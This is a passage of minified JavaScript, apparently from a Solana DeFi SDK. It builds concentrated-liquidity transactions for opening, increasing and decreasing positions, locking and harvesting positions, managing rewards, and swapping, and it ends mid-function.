            associatedOnly: !A && u,
            checkCreateATAOwner: c,
          });
        S && (b = S),
          y.addInstruction(_ || {}),
          (void 0 === w || void 0 === b) &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let T = e || (await this.getClmmPoolKeys(t.id)),
          C = await iE.openPositionFromLiquidityInstructions({
            poolInfo: t,
            poolKeys: T,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: w,
              tokenAccountB: b,
            },
            tickLower: i,
            tickUpper: s,
            liquidity: a,
            amountMaxA: r,
            amountMaxB: o,
            withMetadata: l,
            getEphemeralSigners: p,
            nft2022: m,
          });
        return (
          y.addInstruction(C),
          y.addCustomComputeBudget(f),
          y.addTipInstruction(h),
          y.versionBuild({ txVersion: d, extInfo: { address: C.address } })
        );
      }
      async increasePositionFromLiquidity(t) {
        var e;
        let n,
          r,
          {
            poolInfo: o,
            poolKeys: i,
            ownerPosition: s,
            amountMaxA: a,
            amountMaxB: u,
            liquidity: c,
            ownerInfo: l,
            associatedOnly: d = !0,
            checkCreateATAOwner: f = !1,
            computeBudgetConfig: h,
            txTipConfig: p,
            txVersion: m,
            feePayer: g,
          } = t,
          y = this.createTxBuilder(g),
          w = l.useSOLBalance && o.mintA.address === zI.toString(),
          b = l.useSOLBalance && o.mintB.address === zI.toString(),
          { account: v, instructionParams: A } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: o.mintA.programId,
              mint: new Xi(o.mintA.address),
              notUseTokenAccount: w,
              owner: this.scope.ownerPubKey,
              createInfo:
                w || a.isZero()
                  ? { payer: this.scope.ownerPubKey, amount: a }
                  : void 0,
              skipCloseAccount: !w,
              associatedOnly: !w && d,
              checkCreateATAOwner: f,
            });
        v && (n = v), y.addInstruction(A || {});
        let { account: k, instructionParams: I } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: o.mintB.programId,
            mint: new Xi(o.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              b || u.isZero()
                ? { payer: this.scope.ownerPubKey, amount: u }
                : void 0,
            notUseTokenAccount: b,
            skipCloseAccount: !b,
            associatedOnly: !b && d,
            checkCreateATAOwner: f,
          });
        k && (r = k),
          y.addInstruction(I || {}),
          !n &&
            !r &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let S = null != i ? i : await this.getClmmPoolKeys(o.id),
          _ = iE.increasePositionFromLiquidityInstructions({
            poolInfo: o,
            poolKeys: S,
            ownerPosition: s,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: n,
              tokenAccountB: r,
            },
            liquidity: c,
            amountMaxA: a,
            amountMaxB: u,
            nft2022:
              null ==
              (e = await this.scope.connection.getAccountInfo(s.nftMint))
                ? void 0
                : e.owner.equals(Tc),
          });
        return (
          y.addInstruction(_),
          y.addCustomComputeBudget(h),
          y.addTipInstruction(p),
          y.versionBuild({ txVersion: m, extInfo: { address: _.address } })
        );
      }
      async increasePositionFromBase(t) {
        var e;
        let n,
          r,
          {
            poolInfo: o,
            ownerPosition: i,
            base: s,
            baseAmount: a,
            otherAmountMax: u,
            ownerInfo: c,
            associatedOnly: l = !0,
            checkCreateATAOwner: d = !1,
            computeBudgetConfig: f,
            txTipConfig: h,
            txVersion: p,
            feePayer: m,
          } = t,
          g = this.createTxBuilder(m),
          y = c.useSOLBalance && o.mintA.address === zI.toString(),
          w = c.useSOLBalance && o.mintB.address === zI.toString(),
          { account: b, instructionParams: v } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: o.mintA.programId,
              mint: new Xi(o.mintA.address),
              notUseTokenAccount: y,
              owner: this.scope.ownerPubKey,
              createInfo:
                y || ("MintA" === s ? a : u).isZero()
                  ? {
                      payer: this.scope.ownerPubKey,
                      amount: "MintA" === s ? a : u,
                    }
                  : void 0,
              skipCloseAccount: !y,
              associatedOnly: !y && l,
              checkCreateATAOwner: d,
            });
        b && (n = b), g.addInstruction(v || {});
        let { account: A, instructionParams: k } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: o.mintB.programId,
            mint: new Xi(o.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              w || ("MintA" === s ? u : a).isZero()
                ? {
                    payer: this.scope.ownerPubKey,
                    amount: "MintA" === s ? u : a,
                  }
                : void 0,
            notUseTokenAccount: w,
            skipCloseAccount: !w,
            associatedOnly: !w && l,
            checkCreateATAOwner: d,
          });
        A && (r = A),
          g.addInstruction(k || {}),
          !n &&
            !r &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let I = await this.getClmmPoolKeys(o.id),
          S = iE.increasePositionFromBaseInstructions({
            poolInfo: o,
            poolKeys: I,
            ownerPosition: i,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: n,
              tokenAccountB: r,
            },
            base: s,
            baseAmount: a,
            otherAmountMax: u,
            nft2022:
              null ==
              (e = await this.scope.connection.getAccountInfo(i.nftMint))
                ? void 0
                : e.owner.equals(Tc),
          });
        return (
          g.addInstruction(S),
          g.addCustomComputeBudget(f),
          g.addTipInstruction(h),
          g.versionBuild({ txVersion: p, extInfo: { address: S.address } })
        );
      }
      async decreaseLiquidity(t) {
        var e;
        let {
          poolInfo: n,
          poolKeys: r,
          ownerPosition: o,
          ownerInfo: i,
          amountMinA: s,
          amountMinB: a,
          liquidity: u,
          associatedOnly: c = !0,
          checkCreateATAOwner: l = !1,
          computeBudgetConfig: d,
          txTipConfig: f,
          txVersion: h,
          feePayer: p,
        } = t;
        !1 === this.scope.availability.removeConcentratedPosition &&
          this.logAndCreateError(
            "remove position feature disabled in your region"
          );
        let m,
          g,
          y = this.createTxBuilder(p),
          w = i.useSOLBalance && n.mintA.address === zI.toString(),
          b = i.useSOLBalance && n.mintB.address === zI.toString(),
          { account: v, instructionParams: A } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: n.mintA.programId,
              mint: new Xi(n.mintA.address),
              notUseTokenAccount: w,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !w,
              associatedOnly: !w && c,
              checkCreateATAOwner: l,
            });
        (m = v), A && y.addInstruction(A);
        let { account: k, instructionParams: I } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: n.mintB.programId,
            mint: new Xi(n.mintB.address),
            notUseTokenAccount: b,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !b,
            associatedOnly: !b && c,
            checkCreateATAOwner: l,
          });
        (g = k), I && y.addInstruction(I);
        let S = [];
        for (let E of n.rewardDefaultInfos) {
          let t,
            e = i.useSOLBalance && E.mint.address === zI.toString();
          if (E.mint.address === n.mintA.address) t = m;
          else if (E.mint.address === n.mintB.address) t = g;
          else {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Xi(E.mint.programId),
                mint: new Xi(E.mint.address),
                notUseTokenAccount: e,
                owner: this.scope.ownerPubKey,
                createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
                skipCloseAccount: !e,
                associatedOnly: !e && c,
                checkCreateATAOwner: l,
              });
            (t = n), r && y.addInstruction(r);
          }
          S.push(t);
        }
        !m &&
          !g &&
          this.logAndCreateError(
            "cannot found target token accounts",
            "tokenAccounts",
            this.scope.account.tokenAccountRawInfos
          );
        let _ = null != r ? r : await this.getClmmPoolKeys(n.id),
          T =
            null == (e = await this.scope.connection.getAccountInfo(o.nftMint))
              ? void 0
              : e.owner.equals(Tc),
          C = await iE.decreaseLiquidityInstructions({
            poolInfo: n,
            poolKeys: _,
            ownerPosition: o,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: m,
              tokenAccountB: g,
              rewardAccounts: S,
            },
            liquidity: u,
            amountMinA: s,
            amountMinB: a,
            nft2022: T,
          });
        y.addInstruction({
          instructions: C.instructions,
          instructionTypes: [vS],
        });
        let B = vA({}, C.address);
        if (i.closePosition) {
          let t = await iE.closePositionInstructions({
            poolInfo: n,
            poolKeys: _,
            ownerInfo: { wallet: this.scope.ownerPubKey },
            ownerPosition: o,
            nft2022: T,
          });
          y.addInstruction({
            endInstructions: t.instructions,
            endInstructionTypes: t.instructionTypes,
          }),
            (B = vA(vA({}, B), t.address));
        }
        return (
          y.addCustomComputeBudget(d),
          y.addTipInstruction(f),
          y.versionBuild({ txVersion: h, extInfo: { address: B } })
        );
      }
      async lockPosition(t) {
        var e;
        let {
            programId: n = I_,
            authProgramId: r = S_,
            poolProgramId: o = k_,
            ownerPosition: i,
            payer: s,
            computeBudgetConfig: a,
            txTipConfig: u,
            txVersion: c,
            getEphemeralSigners: l,
            feePayer: d,
          } = t,
          f = this.createTxBuilder(d),
          h = await iE.makeLockPositions({
            programId: n,
            authProgramId: r,
            poolProgramId: o,
            wallet: this.scope.ownerPubKey,
            payer: null != s ? s : this.scope.ownerPubKey,
            nftMint: i.nftMint,
            getEphemeralSigners: l,
            nft2022:
              null ==
              (e = await this.scope.connection.getAccountInfo(i.nftMint))
                ? void 0
                : e.owner.equals(Tc),
          });
        return (
          f.addInstruction(h),
          f.addCustomComputeBudget(a),
          f.addTipInstruction(u),
          f.versionBuild({ txVersion: c, extInfo: h.address })
        );
      }
      async harvestLockPosition(t) {
        let {
            programId: e = I_,
            authProgramId: n = S_,
            clmmProgram: r = k_,
            poolKeys: o,
            lockData: i,
            ownerInfo: s = { useSOLBalance: !0 },
            associatedOnly: a = !0,
            checkCreateATAOwner: u = !1,
            computeBudgetConfig: c,
            txTipConfig: l,
            txVersion: d,
            feePayer: f,
          } = t,
          h = o || (await this.getClmmPoolKeys(i.poolId.toString())),
          p = this.createTxBuilder(f),
          m = await this.scope.connection.getAccountInfo(i.positionId);
        m || this.logger.logWithError("position not found", i.positionId);
        let g,
          y,
          w = JB.decode(m.data),
          b = s.useSOLBalance && h.mintA.address === zI.toString(),
          v = s.useSOLBalance && h.mintB.address === zI.toString(),
          { account: A, instructionParams: k } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: h.mintA.programId,
              mint: new Xi(h.mintA.address),
              notUseTokenAccount: b,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !b,
              associatedOnly: !b && a,
              checkCreateATAOwner: u,
            });
        (g = A), k && p.addInstruction(k);
        let { account: I, instructionParams: S } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: h.mintB.programId,
            mint: new Xi(h.mintB.address),
            notUseTokenAccount: v,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !v,
            associatedOnly: !v && a,
            checkCreateATAOwner: u,
          });
        (y = I), S && p.addInstruction(S);
        let _ = {},
          T = [];
        for (let N of h.rewardInfos) {
          let t = s.useSOLBalance && N.mint.address === zI.toString(),
            e = _[N.mint.address];
          if (!e) {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Xi(N.mint.programId),
                mint: new Xi(N.mint.address),
                notUseTokenAccount: t,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !t,
                createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
                associatedOnly: !t && a,
              });
            (e = n), r && p.addInstruction(r);
          }
          (_[N.mint.address] = e), T.push(e);
        }
        let C = _B(e, i.lockNftMint).publicKey,
          B = h_(this.scope.ownerPubKey, i.lockNftMint, _c).publicKey,
          E = FB.getTickArrayStartIndexByTick(
            w.tickLower,
            h.config.tickSpacing
          ),
          x = FB.getTickArrayStartIndexByTick(
            w.tickUpper,
            h.config.tickSpacing
          ),
          { publicKey: P } = yB(new Xi(h.programId), i.poolId, E),
          { publicKey: R } = yB(new Xi(h.programId), i.poolId, x),
          { publicKey: O } = wB(
            new Xi(h.programId),
            i.poolId,
            w.tickLower,
            w.tickUpper
          ),
          M = [];
        for (let N = 0; N < h.rewardInfos.length; N++)
          M.push({
            poolRewardVault: new Xi(h.rewardInfos[N].vault),
            ownerRewardVault: T[N],
            rewardMint: new Xi(h.rewardInfos[N].mint.address),
          });
        let L = await iE.harvestLockPositionInstructionV2({
          programId: e,
          auth: n,
          lockPositionId: C,
          clmmProgram: r,
          lockOwner: this.scope.ownerPubKey,
          lockNftMint: i.lockNftMint,
          lockNftAccount: B,
          positionNftAccount: i.nftAccount,
          positionId: i.positionId,
          poolId: i.poolId,
          protocolPosition: O,
          vaultA: new Xi(h.vault.A),
          vaultB: new Xi(h.vault.B),
          tickArrayLower: P,
          tickArrayUpper: R,
          userVaultA: g,
          userVaultB: y,
          mintA: new Xi(h.mintA.address),
          mintB: new Xi(h.mintB.address),
          rewardAccounts: M,
          exTickArrayBitmap: kB(r, i.poolId).publicKey,
        });
        return (
          p.addInstruction({ instructions: [L], instructionTypes: [BS] }),
          p.addCustomComputeBudget(c),
          p.addTipInstruction(l),
          p.versionBuild({ txVersion: d })
        );
      }
      async closePosition({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        txVersion: r,
        computeBudgetConfig: o,
        txTipConfig: i,
        feePayer: s,
      }) {
        var a;
        !1 === this.scope.availability.removeConcentratedPosition &&
          this.logAndCreateError(
            "remove position feature disabled in your region"
          );
        let u = this.createTxBuilder(s),
          c = null != e ? e : await this.getClmmPoolKeys(t.id),
          l = iE.closePositionInstructions({
            poolInfo: t,
            poolKeys: c,
            ownerInfo: { wallet: this.scope.ownerPubKey },
            ownerPosition: n,
            nft2022:
              null ==
              (a = await this.scope.connection.getAccountInfo(n.nftMint))
                ? void 0
                : a.owner.equals(Tc),
          });
        return (
          u.addCustomComputeBudget(o),
          u.addTipInstruction(i),
          u
            .addInstruction(l)
            .versionBuild({ txVersion: r, extInfo: { address: l.address } })
        );
      }
      async initReward({
        poolInfo: t,
        ownerInfo: e,
        rewardInfo: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txVersion: s,
        feePayer: a,
      }) {
        n.endTime <= n.openTime &&
          this.logAndCreateError("reward time error", "rewardInfo", n);
        let u = this.createTxBuilder(a),
          c = e.useSOLBalance && n.mint.address.toString() === zI.toString(),
          l = n.perSecond.mul(n.endTime - n.openTime),
          { account: d, instructionParams: f } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: new Xi(n.mint.address),
              mint: new Xi(n.mint.address),
              notUseTokenAccount: !!c,
              skipCloseAccount: !c,
              owner: this.scope.ownerPubKey,
              createInfo: c
                ? {
                    payer: e.feePayer || this.scope.ownerPubKey,
                    amount: new Zn(
                      new mI(l.toFixed(0)).gte(l)
                        ? l.toFixed(0)
                        : l.add(1).toFixed(0)
                    ),
                  }
                : void 0,
              associatedOnly: !c && r,
              checkCreateATAOwner: o,
            });
        f && u.addInstruction(f),
          d ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            );
        let h = await this.getClmmPoolKeys(t.id),
          p = iE.initRewardInstructions({
            poolInfo: t,
            poolKeys: h,
            ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: d },
            rewardInfo: {
              programId: new Xi(n.mint.programId),
              mint: new Xi(n.mint.address),
              openTime: n.openTime,
              endTime: n.endTime,
              emissionsPerSecondX64: MB.decimalToX64(n.perSecond),
            },
          });
        return (
          u.addInstruction(p),
          u.addCustomComputeBudget(i),
          u.versionBuild({ txVersion: s, extInfo: { address: p.address } })
        );
      }
      async initRewards({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfos: r,
        associatedOnly: o = !0,
        checkCreateATAOwner: i = !1,
        computeBudgetConfig: s,
        txTipConfig: a,
        txVersion: u,
        feePayer: c,
      }) {
        for (let f of r)
          f.endTime <= f.openTime &&
            this.logAndCreateError("reward time error", "rewardInfo", f);
        let l = this.createTxBuilder(c),
          d = {};
        for (let f of r) {
          let r = n.useSOLBalance && f.mint.address === zI.toString(),
            s = f.perSecond.mul(f.endTime - f.openTime),
            { account: a, instructionParams: u } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Xi(f.mint.programId),
                mint: new Xi(f.mint.address),
                notUseTokenAccount: !!r,
                skipCloseAccount: !r,
                owner: this.scope.ownerPubKey,
                createInfo: r
                  ? {
                      payer: n.feePayer || this.scope.ownerPubKey,
                      amount: new Zn(
                        new mI(s.toFixed(0)).gte(s)
                          ? s.toFixed(0)
                          : s.add(1).toFixed(0)
                      ),
                    }
                  : void 0,
                associatedOnly: !r && o,
                checkCreateATAOwner: i,
              });
          u && l.addInstruction(u),
            a ||
              this.logAndCreateError(
                "no money",
                "ownerRewardAccount",
                this.scope.account.tokenAccountRawInfos
              );
          let c = null != e ? e : await this.getClmmPoolKeys(t.id),
            h = iE.initRewardInstructions({
              poolInfo: t,
              poolKeys: c,
              ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: a },
              rewardInfo: {
                programId: new Xi(f.mint.programId),
                mint: new Xi(f.mint.address),
                openTime: f.openTime,
                endTime: f.endTime,
                emissionsPerSecondX64: MB.decimalToX64(f.perSecond),
              },
            });
          (d = vA(vA({}, d), h.address)), l.addInstruction(h);
        }
        return (
          l.addCustomComputeBudget(s),
          l.addTipInstruction(a),
          l.versionBuild({ txVersion: u, extInfo: { address: d } })
        );
      }
      async setReward({
        poolInfo: t,
        ownerInfo: e,
        rewardInfo: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txTipConfig: s,
        txVersion: a,
        feePayer: u,
      }) {
        n.endTime <= n.openTime &&
          this.logAndCreateError("reward time error", "rewardInfo", n);
        let c = this.createTxBuilder(u),
          l = e.useSOLBalance && n.mint.equals(zI),
          { account: d, instructionParams: f } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: n.programId,
              mint: n.mint,
              notUseTokenAccount: l,
              owner: this.scope.ownerPubKey,
              createInfo: l
                ? {
                    payer: e.feePayer || this.scope.ownerPubKey,
                    amount: new Zn(
                      new mI(
                        n.perSecond.mul(n.endTime - n.openTime).toFixed(0)
                      ).gte(n.perSecond.mul(n.endTime - n.openTime))
                        ? n.perSecond.mul(n.endTime - n.openTime).toFixed(0)
                        : n.perSecond
                            .mul(n.endTime - n.openTime)
                            .add(1)
                            .toFixed(0)
                    ),
                  }
                : void 0,
              associatedOnly: !l && r,
              checkCreateATAOwner: o,
            });
        f && c.addInstruction(f),
          d ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            );
        let h = await this.getClmmPoolKeys(t.id),
          p = iE.setRewardInstructions({
            poolInfo: t,
            poolKeys: h,
            ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: d },
            rewardInfo: {
              mint: n.mint,
              openTime: n.openTime,
              endTime: n.endTime,
              emissionsPerSecondX64: MB.decimalToX64(n.perSecond),
            },
          });
        return (
          c.addInstruction(p),
          c.addCustomComputeBudget(i),
          c.addTipInstruction(s),
          c.versionBuild({ txVersion: a, extInfo: { address: p.address } })
        );
      }
      async setRewards({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfos: r,
        associatedOnly: o = !0,
        checkCreateATAOwner: i = !1,
        computeBudgetConfig: s,
        txTipConfig: a,
        txVersion: u,
        feePayer: c,
      }) {
        let l = this.createTxBuilder(c),
          d = {};
        for (let f of r) {
          f.endTime <= f.openTime &&
            this.logAndCreateError("reward time error", "rewardInfo", f);
          let r = n.useSOLBalance && f.mint.address === zI.toString(),
            { account: s, instructionParams: a } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Xi(f.mint.programId),
                mint: new Xi(f.mint.address),
                notUseTokenAccount: r,
                owner: this.scope.ownerPubKey,
                createInfo: r
                  ? {
                      payer: n.feePayer || this.scope.ownerPubKey,
                      amount: new Zn(
                        new mI(
                          f.perSecond.mul(f.endTime - f.openTime).toFixed(0)
                        ).gte(f.perSecond.mul(f.endTime - f.openTime))
                          ? f.perSecond.mul(f.endTime - f.openTime).toFixed(0)
                          : f.perSecond
                              .mul(f.endTime - f.openTime)
                              .add(1)
                              .toFixed(0)
                      ),
                    }
                  : void 0,
                associatedOnly: !r && o,
                checkCreateATAOwner: i,
              });
          a && l.addInstruction(a),
            s ||
              this.logAndCreateError(
                "no money",
                "ownerRewardAccount",
                this.scope.account.tokenAccountRawInfos
              );
          let u = null != e ? e : await this.getClmmPoolKeys(t.id),
            c = iE.setRewardInstructions({
              poolInfo: t,
              poolKeys: u,
              ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: s },
              rewardInfo: {
                mint: new Xi(f.mint.address),
                openTime: f.openTime,
                endTime: f.endTime,
                emissionsPerSecondX64: MB.decimalToX64(f.perSecond),
              },
            });
          l.addInstruction(c), (d = vA(vA({}, d), c.address));
        }
        return (
          l.addCustomComputeBudget(s),
          l.addTipInstruction(a),
          l.versionBuild({ txVersion: u, extInfo: { address: d } })
        );
      }
      async collectReward({
        poolInfo: t,
        ownerInfo: e,
        rewardMint: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txTipConfig: s,
        txVersion: a,
        feePayer: u,
      }) {
        let c = t.rewardDefaultInfos.find(
          (t) => t.mint.address === n.toString()
        );
        c ||
          this.logAndCreateError(
            "reward mint error",
            "not found reward mint",
            n
          );
        let l = this.createTxBuilder(u),
          d = e.useSOLBalance && n.equals(zI),
          { account: f, instructionParams: h } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: new Xi(c.mint.programId),
              mint: n,
              notUseTokenAccount: d,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !d,
              createInfo: {
                payer: e.feePayer || this.scope.ownerPubKey,
                amount: 0,
              },
              associatedOnly: !d && r,
              checkCreateATAOwner: o,
            });
        h && l.addInstruction(h),
          f ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            );
        let p = await this.getClmmPoolKeys(t.id),
          m = iE.collectRewardInstructions({
            poolInfo: t,
            poolKeys: p,
            ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: f },
            rewardMint: n,
          });
        return (
          l.addInstruction(m),
          l.addCustomComputeBudget(i),
          l.addTipInstruction(s),
          l.versionBuild({ txVersion: a, extInfo: { address: m.address } })
        );
      }
      async collectRewards({
        poolInfo: t,
        ownerInfo: e,
        rewardMints: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a),
          c = {};
        for (let l of n) {
          let n = t.rewardDefaultInfos.find(
            (t) => t.mint.address === l.toString()
          );
          if (!n) {
            this.logAndCreateError(
              "reward mint error",
              "not found reward mint",
              l
            );
            continue;
          }
          let i = e.useSOLBalance && l.equals(zI),
            { account: s, instructionParams: a } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Xi(n.mint.programId),
                mint: l,
                notUseTokenAccount: i,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !i,
                createInfo: {
                  payer: e.feePayer || this.scope.ownerPubKey,
                  amount: 0,
                },
                associatedOnly: !i && r,
                checkCreateATAOwner: o,
              });
          s ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            ),
            a && u.addInstruction(a);
          let d = await this.getClmmPoolKeys(t.id),
            f = iE.collectRewardInstructions({
              poolInfo: t,
              poolKeys: d,
              ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: s },
              rewardMint: l,
            });
          u.addInstruction(f), (c = vA(vA({}, c), f.address));
        }
        return (
          u.addCustomComputeBudget(i),
          u.addTipInstruction(s),
          u.build({ address: c })
        );
      }
      async swap({
        poolInfo: t,
        poolKeys: e,
        inputMint: n,
        amountIn: r,
        amountOutMin: o,
        priceLimit: i,
        observationId: s,
        ownerInfo: a,
        remainingAccounts: u,
        associatedOnly: c = !0,
        checkCreateATAOwner: l = !1,
        txVersion: d,
        computeBudgetConfig: f,
        txTipConfig: h,
        feePayer: p,
      }) {
        let m,
          g,
          y,
          w = this.createTxBuilder(p),
          b = n.toString() === t.mintA.address,
          v = a.useSOLBalance && t.mintA.address === zI.toBase58(),
          A = a.useSOLBalance && t.mintB.address === zI.toBase58();
        if (
          ((m =
            !i || i.equals(new mI(0))
              ? b
                ? JC.add(new Zn(1))
                : YC.sub(new Zn(1))
              : DB.priceToSqrtPriceX64(i, t.mintA.decimals, t.mintB.decimals)),
          !g)
        ) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Xi(t.mintA.address),
              notUseTokenAccount: v,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !v,
              createInfo:
                v || !b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? r : 0,
                    }
                  : void 0,
              associatedOnly: !v && c,
              checkCreateATAOwner: l,
            });
          (g = e), n && w.addInstruction(n);
        }
        if (!y) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintB.programId,
              mint: new Xi(t.mintB.address),
              notUseTokenAccount: A,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !A,
              createInfo:
                A || b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? 0 : r,
                    }
                  : void 0,
              associatedOnly: !A && c,
              checkCreateATAOwner: l,
            });
          (y = e), n && w.addInstruction(n);
        }
        (!g || !y) &&
          this.logAndCreateError("user do not have token account", {
            tokenA: t.mintA.symbol || t.mintA.address,
            tokenB: t.mintB.symbol || t.mintB.address,
            ownerTokenAccountA: g,
            ownerTokenAccountB: y,
            mintAUseSOLBalance: v,
            mintBUseSOLBalance: A,
            associatedOnly: c,
          });
        let k = null != e ? e : await this.getClmmPoolKeys(t.id);
        return (
          w.addInstruction(
            iE.makeSwapBaseInInstructions({
              poolInfo: t,
              poolKeys: k,
              observationId: s,
              ownerInfo: {
                wallet: this.scope.ownerPubKey,
                tokenAccountA: g,
                tokenAccountB: y,
              },
              inputMint: new Xi(n),
              amountIn: r,
              amountOutMin: o,
              sqrtPriceLimitX64: m,
              remainingAccounts: u,
            })
          ),
          w.addCustomComputeBudget(f),
          w.addTipInstruction(h),
          w.versionBuild({ txVersion: d })
        );
      }
      async swapBaseOut({
        poolInfo: t,
        poolKeys: e,
        outputMint: n,
        amountOut: r,
        amountInMax: o,
        priceLimit: i,
        observationId: s,
        ownerInfo: a,
        remainingAccounts: u,
        associatedOnly: c = !0,
        checkCreateATAOwner: l = !1,
        txVersion: d,
        computeBudgetConfig: f,
        txTipConfig: h,
        feePayer: p,
      }) {
        let m,
          g,
          y,
          w = this.createTxBuilder(p),
          b = n.toString() === t.mintB.address,
          v = a.useSOLBalance && t.mintA.address === zI.toBase58(),
          A = a.useSOLBalance && t.mintB.address === zI.toBase58();
        if (
          ((m =
            !i || i.equals(new mI(0))
              ? n.toString() === t.mintB.address
                ? JC.add(new Zn(1))
                : YC.sub(new Zn(1))
              : DB.priceToSqrtPriceX64(i, t.mintA.decimals, t.mintB.decimals)),
          !g)
        ) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Xi(t.mintA.address),
              notUseTokenAccount: v,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !v,
              createInfo:
                v || !b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? o : 0,
                    }
                  : void 0,
              associatedOnly: !v && c,
              checkCreateATAOwner: l,
            });
          (g = e), n && w.addInstruction(n);
        }
        if (!y) {
          let { account: e, instructionParams: n } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintB.programId,
              mint: new Xi(t.mintB.address),
              notUseTokenAccount: A,
              owner: this.scope.ownerPubKey,
              skipCloseAccount: !A,
              createInfo:
                A || b
                  ? {
                      payer: a.feePayer || this.scope.ownerPubKey,
                      amount: b ? 0 : o,
                    }
                  : void 0,
              associatedOnly: !A && c,
              checkCreateATAOwner: l,
            });
          (y = e), n && w.addInstruction(n);
        }
        (!g || !y) &&
          this.logAndCreateError("user do not have token account", {
            tokenA: t.mintA.symbol || t.mintA.address,
            tokenB: t.mintB.symbol || t.mintB.address,
            ownerTokenAccountA: g,
            ownerTokenAccountB: y,
            mintAUseSOLBalance: v,
            mintBUseSOLBalance: A,
            associatedOnly: c,
          });
        let k = null != e ? e : await this.getClmmPoolKeys(t.id);
        return (
          w.addInstruction(
            iE.makeSwapBaseOutInstructions({
              poolInfo: t,
              poolKeys: k,
              observationId: s,
              ownerInfo: {
                wallet: this.scope.ownerPubKey,
                tokenAccountA: g,
                tokenAccountB: y,
              },
              outputMint: new Xi(n),
              amountOut: r,
              amountInMax: o,
              sqrtPriceLimitX64: m,
              remainingAccounts: u,
            })
          ),
          w.addCustomComputeBudget(f),
          w.addTipInstruction(h),
          w.versionBuild({ txVersion: d })
        );
      }
      async harvestAllRewards({
        allPoolInfo: t,
        allPositions: e,
        lockInfo: n,
        ownerInfo: r,
        associatedOnly: o = !0,
        checkCreateATAOwner: i = !1,
        programId: s,
        txVersion: a,
        computeBudgetConfig: u,
        feePayer: c,
      }) {
        var l, d;
        let f = {};
        for (let y of this.scope.account.tokenAccountRawInfos)
          o
            ? h_(
                this.scope.ownerPubKey,
                y.accountInfo.mint,
                s
